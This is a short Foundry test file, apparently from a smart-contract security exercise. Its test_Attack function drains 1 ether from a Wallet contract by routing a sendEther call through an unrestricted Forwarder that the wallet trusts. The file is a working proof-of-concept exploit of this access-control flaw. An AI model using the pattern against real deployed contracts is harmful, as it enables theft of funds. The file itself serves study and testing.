// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Forwarder, Wallet} from "../src/Forwarder.sol";

contract ForwarderTest is Test {
    Forwarder public forwarder;
    Wallet public wallet;

    function setUp() public {
        forwarder = new Forwarder();
        wallet = new Wallet{value: 1 ether}(address(forwarder));
    }

    function test_Attack() public {
        address receiver = address(0x01);

        forwarder.functionCall(
            address(wallet), abi.encodeWithSignature("sendEther(address,uint256)", address(receiver), 1 ether)
        );

        console2.log("receiver balance", receiver.balance);
        require(address(wallet).balance == 0, "not empty wallet");
        require(receiver.balance == 1 ether, "should have 1 ether");
    }

    fallback() external payable {}
}
